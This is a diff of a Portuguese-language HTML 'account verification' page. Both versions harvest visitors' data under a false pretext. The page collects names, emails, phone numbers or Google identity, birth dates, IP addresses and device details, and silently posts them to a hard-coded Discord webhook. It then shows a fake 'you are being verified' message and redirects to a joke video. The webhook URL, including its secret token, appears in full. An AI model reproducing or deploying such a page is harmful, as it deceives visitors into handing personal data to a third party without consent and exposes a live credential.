@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Conta</title>
+    <title>Formulário de Verificação</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             max-width: 500px;
             margin: 0 auto;
             padding: 20px;
@@ -23,48 +23,7 @@
         h1 {
             text-align: center;
             color: #333;
-            margin-bottom: 10px;
-        }
-        
-        .login-methods {
-            text-align: center;
-            margin: 20px 0;
-            position: relative;
-        }
-        
-        .login-methods::after {
-            content: "";
-            display: block;
-            width: 90%;
-            height: 1px;
-            background-color: #ddd;
-            margin: 15px auto;
-        }
-        
-        .method-options {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .method-tab {
-            padding: 8px 15px;
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-        }
-        
-        .method-tab.active {
-            border-bottom: 2px solid #4285F4;
-            font-weight: bold;
-        }
-        
-        .form-step {
-            display: none;
-        }
-        
-        .form-step.active {
-            display: block;
+            margin-bottom: 30px;
         }
         
         .form-group {
@@ -77,7 +36,9 @@
             font-weight: bold;
         }
         
-        input {
+        input[type="text"],
+        input[type="email"],
+        input[type="date"] {
             width: 100%;
             padding: 10px;
             border: 1px solid #ddd;
@@ -85,49 +46,21 @@
             font-size: 16px;
         }
         
-        .btn {
-            padding: 12px 20px;
+        .submit-btn {
+            background-color: #4CAF50;
+            color: white;
             border: none;
+            padding: 12px 20px;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
             width: 100%;
-        }
-        
-        .btn-verify {
-            background-color: #4CAF50;
-            color: white;
-        }
-        
-        .btn-verify:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-        
-        .btn-verify.error {
-            background-color: #f44336;
-        }
-        
-        .btn-google {
-            background-color: white;
-            color: #757575;
-            border: 1px solid #ddd;
-            padding: 10px 15px;
+            transition: background-color 0.3s;
             margin-top: 10px;
         }
         
-        .btn-google:hover {
-            background-color: #f5f5f5;
-        }
-        
-        .btn-google img {
-            width: 20px;
-            height: 20px;
+        .submit-btn:hover {
+            background-color: #45a049;
         }
         
         .verification-screen {
@@ -155,8 +88,11 @@
         .continue-button {
             background-color: #FF0000;
             color: white;
+            border: none;
             padding: 12px 25px;
             border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
             text-decoration: none;
             transition: background-color 0.3s;
         }
@@ -164,387 +100,132 @@
         .continue-button:hover {
             background-color: #CC0000;
         }
-        
-        .loading {
-            display: none;
-            margin-top: 20px;
-            text-align: center;
-        }
-        
-        .code-inputs {
-            display: flex;
-            justify-content: space-between;
-            margin: 20px 0;
-        }
-        
-        .code-input {
-            width: 50px;
-            height: 60px;
-            font-size: 24px;
-            text-align: center;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
     </style>
 </head>
 <body>
     <div class="form-container" id="formContainer">
-        <h1>Verificação de Conta</h1>
-        
-        <div class="login-methods">
-            <h3>Métodos de login</h3>
-            <div class="method-options">
-                <div class="method-tab active" data-tab="email">Email</div>
-                <div class="method-tab" data-tab="phone">Número</div>
-            </div>
-        </div>
-        
-        <!-- Formulário de Email -->
-        <div class="form-step active" id="emailStep">
-            <form id="emailForm">
-                <div class="form-group">
-                    <label for="fullName">Nome completo:</label>
-                    <input type="text" id="fullName" name="fullName" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="email">Email:</label>
-                    <input type="email" id="email" name="email" required>
-                </div>
-                
-                <button type="submit" class="btn btn-verify">Verificar</button>
-                <button type="button" id="googleLogin" class="btn btn-google">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
-                    Continuar com Google
-                </button>
-            </form>
-        </div>
-        
-        <!-- Formulário de Telefone -->
-        <div class="form-step" id="phoneStep">
-            <form id="phoneForm">
-                <div class="form-group">
-                    <label for="phoneName">Nome completo:</label>
-                    <input type="text" id="phoneName" name="phoneName" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="phoneNumber">Número de telefone:</label>
-                    <input type="tel" id="phoneNumber" name="phoneNumber" required>
-                </div>
-                
-                <button type="submit" class="btn btn-verify">Enviar Código</button>
-            </form>
-        </div>
-        
-        <!-- Verificação de Código SMS -->
-        <div class="form-step" id="smsVerificationStep">
-            <h3>Código de verificação</h3>
-            <p>Enviamos um código de 4 dígitos para o número informado</p>
-            
-            <div class="code-inputs">
-                <input type="text" class="code-input" maxlength="1" data-index="0">
-                <input type="text" class="code-input" maxlength="1" data-index="1">
-                <input type="text" class="code-input" maxlength="1" data-index="2">
-                <input type="text" class="code-input" maxlength="1" data-index="3">
+        <h1>Formulário de Verificação</h1>
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="fullName">Nome completo:</label>
+                <input type="text" id="fullName" name="fullName" required>
             </div>
             
-            <button type="button" id="verifyCodeBtn" class="btn btn-verify" disabled>Verificar Código</button>
-            <button type="button" id="resendCodeBtn" class="btn" style="margin-top: 10px;">Reenviar Código</button>
-        </div>
-        
-        <div class="loading" id="loading">
-            <p>Processando verificação...</p>
-        </div>
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="birthDate">Data de nascimento (Opcional):</label>
+                <input type="date" id="birthDate" name="birthDate">
+            </div>
+            
+            <button type="submit" class="submit-btn">Verificar</button>
+        </form>
     </div>
     
     <div class="verification-screen" id="verificationScreen">
-        <p class="verification-message">Verificação concluída com sucesso!</p>
+        <p class="verification-message">Você está sendo verificado. Enviaremos um email quando sua verificação for concluída.</p>
         <a href="https://youtu.be/dQw4w9WgXcQ" class="continue-button">Continuar</a>
     </div>
 
-    <!-- API do Google -->
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
-    
     <script>
-        // Configurações
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m';
-        const GOOGLE_CLIENT_ID = '640154624957-dag7evugi4hdbiqv3khqsvbscg9slmic.apps.googleusercontent.com';
+        // Função para detectar dispositivo e navegador
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = "Desktop";
+            
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceType = /Android/i.test(userAgent) ? "Mobile (Android)" : 
+                            /iPhone|iPad|iPod/i.test(userAgent) ? "Mobile (iOS)" : "Mobile";
+            }
+            
+            return {
+                device: deviceType,
+                browser: getBrowser(),
+                os: getOS(),
+                userAgent: userAgent
+            };
+        }
         
-        // Variáveis globais
-        let currentMethod = 'email';
-        let verificationCode = '';
-        let userPhoneNumber = '';
+        function getBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
+            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+            if (userAgent.indexOf("Edge") > -1) return "Edge";
+            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+            if (userAgent.indexOf("Safari") > -1) return "Safari";
+            return "Unknown";
+        }
         
-        // Inicialização
-        document.addEventListener('DOMContentLoaded', function() {
-            // Troca entre métodos de login
-            document.querySelectorAll('.method-tab').forEach(tab => {
-                tab.addEventListener('click', function() {
-                    document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
-                    this.classList.add('active');
-                    
-                    currentMethod = this.getAttribute('data-tab');
-                    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
-                    document.getElementById(`${currentMethod}Step`).classList.add('active');
-                });
-            });
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Windows") > -1) return "Windows";
+            if (userAgent.indexOf("Mac") > -1) return "MacOS";
+            if (userAgent.indexOf("Linux") > -1) return "Linux";
+            if (userAgent.indexOf("Android") > -1) return "Android";
+            if (userAgent.indexOf("iOS") > -1 || /iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
+            return "Unknown";
+        }
+
+        // Envio do formulário
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            // Configuração do Google Sign-In
-            google.accounts.id.initialize({
-                client_id: GOOGLE_CLIENT_ID,
-                callback: handleGoogleLogin
-            });
-            
-            // Envio do formulário de email
-            document.getElementById('emailForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                verifyEmail();
-            });
-            
-            // Envio do formulário de telefone
-            document.getElementById('phoneForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                sendSMSCode();
-            });
-            
-            // Botão de login com Google
-            document.getElementById('googleLogin').addEventListener('click', function() {
-                google.accounts.id.prompt();
-            });
-            
-            // Verificação do código SMS
-            document.getElementById('verifyCodeBtn').addEventListener('click', verifySMSCode);
-            
-            // Reenvio do código SMS
-            document.getElementById('resendCodeBtn').addEventListener('click', sendSMSCode);
-            
-            // Lógica para os inputs de código
-            document.querySelectorAll('.code-input').forEach(input => {
-                input.addEventListener('input', function() {
-                    const nextIndex = parseInt(this.getAttribute('data-index')) + 1;
-                    const nextInput = document.querySelector(`.code-input[data-index="${nextIndex}"]`);
-                    
-                    if (this.value.length === 1 && nextInput) {
-                        nextInput.focus();
-                    }
-                    
-                    checkCodeInputs();
-                });
-                
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value.length === 0) {
-                        const prevIndex = parseInt(this.getAttribute('data-index')) - 1;
-                        const prevInput = document.querySelector(`.code-input[data-index="${prevIndex}"]`);
-                        
-                        if (prevInput) {
-                            prevInput.focus();
-                        }
-                    }
-                });
-            });
-        });
-        
-        // Função para verificar email
-        async function verifyEmail() {
-            showLoading(true);
+            // Obter IP e informações do dispositivo
+            const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json()).catch(() => ({ ip: 'Não detectado' }));
+            const deviceInfo = getDeviceInfo();
             
             const formData = {
-                name: document.getElementById('fullName').value,
+                fullName: document.getElementById('fullName').value,
                 email: document.getElementById('email').value,
-                method: "Email"
+                birthDate: document.getElementById('birthDate').value || 'Não informado',
+                ip: ipData.ip,
+                ...deviceInfo
+            };
+            
+            // Enviar para o webhook do Discord
+            const discordMessage = {
+                content: '📄 **Novo formulário enviado**',
+                embeds: [{
+                    title: 'Dados do Formulário',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'Nome completo', value: formData.fullName, inline: true },
+                        { name: 'Email', value: formData.email, inline: true },
+                        { name: 'Data de nascimento', value: formData.birthDate, inline: true },
+                        { name: 'IP', value: formData.ip, inline: true },
+                        { name: 'Dispositivo', value: formData.device, inline: true },
+                        { name: 'Sistema Operacional', value: formData.os, inline: true },
+                        { name: 'Navegador', value: formData.browser, inline: true },
+                        { name: 'User Agent', value: `\`\`\`${formData.userAgent}\`\`\``, inline: false }
+                    ],
+                    footer: { text: 'Formulário enviado via Site' },
+                    timestamp: new Date().toISOString()
+                }]
             };
             
             try {
-                // Obter IP do usuário
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                formData.ip = (await ipResponse.json()).ip;
-                
-                // Enviar para o Discord
-                await sendToDiscord(formData);
-                
-                // Mostrar tela de sucesso
-                showVerificationSuccess();
-            } catch (error) {
-                console.error("Erro na verificação:", error);
-                alert("Ocorreu um erro durante a verificação. Por favor, tente novamente.");
-            } finally {
-                showLoading(false);
-            }
-        }
-        
-        // Função para enviar código SMS
-        async function sendSMSCode() {
-            showLoading(true);
-            
-            userPhoneNumber = document.getElementById('phoneNumber').value;
-            const userName = document.getElementById('phoneName').value;
-            
-            // Gerar código de 4 dígitos
-            verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
-            
-            try {
-                // Aqui você precisaria integrar com um serviço de SMS real como Twilio
-                // Esta é uma simulação - na prática você faria uma chamada para sua API
-                console.log(`Código de verificação para ${userPhoneNumber}: ${verificationCode}`);
-                
-                // Mostrar etapa de verificação
-                document.getElementById('phoneStep').classList.remove('active');
-                document.getElementById('smsVerificationStep').classList.add('active');
-                
-                // Limpar inputs de código
-                document.querySelectorAll('.code-input').forEach(input => input.value = '');
-                document.getElementById('verifyCodeBtn').disabled = true;
-                
-                alert(`SIMULAÇÃO: Código ${verificationCode} enviado para ${userPhoneNumber}`);
-                
-            } catch (error) {
-                console.error("Erro ao enviar SMS:", error);
-                alert("Ocorreu um erro ao enviar o código. Por favor, tente novamente.");
-            } finally {
-                showLoading(false);
-            }
-        }
-        
-        // Função para verificar código SMS
-        function verifySMSCode() {
-            showLoading(true);
-            
-            // Obter código digitado
-            let enteredCode = '';
-            document.querySelectorAll('.code-input').forEach(input => {
-                enteredCode += input.value;
-            });
-            
-            // Verificar código
-            if (enteredCode === verificationCode) {
-                // Código correto
-                document.getElementById('verifyCodeBtn').classList.remove('error');
-                
-                // Enviar dados para o Discord
-                const formData = {
-                    name: document.getElementById('phoneName').value,
-                    phone: userPhoneNumber,
-                    method: "SMS"
-                };
-                
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(ipData => {
-                        formData.ip = ipData.ip;
-                        return sendToDiscord(formData);
-                    })
-                    .then(() => {
-                        showVerificationSuccess();
-                    })
-                    .catch(error => {
-                        console.error("Erro:", error);
-                        alert("Ocorreu um erro durante a verificação.");
-                    })
-                    .finally(() => {
-                        showLoading(false);
-                    });
-            } else {
-                // Código incorreto
-                document.getElementById('verifyCodeBtn').classList.add('error');
-                document.getElementById('verifyCodeBtn').disabled = true;
-                alert("Código incorreto. Por favor, tente novamente.");
-                showLoading(false);
-            }
-        }
-        
-        // Função para login com Google
-        async function handleGoogleLogin(response) {
-            showLoading(true);
-            
-            try {
-                // Decodificar token JWT
-                const payload = JSON.parse(atob(response.credential.split('.')[1]));
-                
-                // Obter IP do usuário
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Enviar para o Discord
-                await sendToDiscord({
-                    name: payload.name,
-                    email: payload.email,
-                    method: "Google",
-                    ip: ipData.ip
-                });
-                
-                // Mostrar tela de sucesso
-                showVerificationSuccess();
-            } catch (error) {
-                console.error("Erro no login Google:", error);
-                alert("Ocorreu um erro durante a verificação. Por favor, tente novamente.");
-            } finally {
-                showLoading(false);
-            }
-        }
-        
-        // Função para enviar dados para o Discord
-        async function sendToDiscord(data) {
-            const embed = {
-                title: "Nova Verificação de Conta",
-                color: 0x00ff00,
-                fields: [
-                    { name: "Nome", value: data.name || "Não fornecido", inline: true },
-                    { 
-                        name: "Contato", 
-                        value: data.email || data.phone || "Não fornecido", 
-                        inline: true 
-                    },
-                    { name: "Método", value: data.method || "Email", inline: true },
-                    { name: "IP", value: data.ip || "Não detectado", inline: true },
-                    { name: "Data", value: new Date().toLocaleString(), inline: true }
-                ]
-            };
-            
-            try {
-                await fetch(DISCORD_WEBHOOK, {
+                await fetch('https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(discordMessage)
                 });
+                
+                // Mostrar tela de verificação
+                document.getElementById('formContainer').style.display = 'none';
+                document.getElementById('verificationScreen').style.display = 'flex';
+                
             } catch (error) {
-                console.error("Erro ao enviar para Discord:", error);
-                throw error;
+                console.error('Erro ao enviar para o Discord:', error);
+                alert('Ocorreu um erro ao enviar o formulário. Por favor, tente novamente.');
             }
-        }
-        
-        // Função para verificar inputs do código
-        function checkCodeInputs() {
-            let codeComplete = true;
-            let enteredCode = '';
-            
-            document.querySelectorAll('.code-input').forEach(input => {
-                if (input.value.length === 0) {
-                    codeComplete = false;
-                }
-                enteredCode += input.value;
-            });
-            
-            document.getElementById('verifyCodeBtn').disabled = !codeComplete;
-            
-            // Verificar se o código está errado
-            if (codeComplete && enteredCode !== verificationCode) {
-                document.getElementById('verifyCodeBtn').classList.add('error');
-            } else {
-                document.getElementById('verifyCodeBtn').classList.remove('error');
-            }
-        }
-        
-        // Função para mostrar/ocultar loading
-        function showLoading(show) {
-            document.getElementById('loading').style.display = show ? 'block' : 'none';
-        }
-        
-        // Função para mostrar tela de sucesso
-        function showVerificationSuccess() {
-            document.getElementById('formContainer').style.display = 'none';
-            document.getElementById('verificationScreen').style.display = 'flex';
-        }
+        });
     </script>
 </body>
-    </html>
+</html>
